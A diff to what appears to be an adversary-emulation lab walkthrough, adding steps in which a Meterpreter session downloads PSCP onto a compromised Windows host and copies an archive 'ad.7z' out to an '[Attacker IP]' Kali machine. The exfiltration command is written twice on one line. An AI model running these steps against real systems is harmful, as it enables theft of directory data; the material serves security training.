@@ -459,6 +459,26 @@ meterpreter > load powershell
 meterpreter > powershell_shell
 ```
 
+Then start to download `PSCP` using the following command:
+
+```bash
+Invoke-WebRequest -Uri https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe -OutFile .\pscp.exe
+```
+
+Once downloaded, exit to the <kb>powershell</kb> module since we need to load the <kb>cmd</kb> or <kb>shell</kb> module in order for `PSCP` to execute properly:
+
+```bash
+meterpreter > shell
+```
+
+We can now transfer the file `ad.7z` back to our Attacker VM using the following command:
+
+```bash
+C:\Users\Administrator\Downloads>.\pscp.exe -P 22 .\ad.7z [username]@[Attacker IP]:/home/kali/Desktop .\pscp.exe -P 22 .\ad.7z [username]@[Attacker IP]:/home/kali/Desktop
+```
+
+Once executed, type `y` to store and cache the key of the AttackerVM and then type the password:
+
 FIN6
 
 ## References
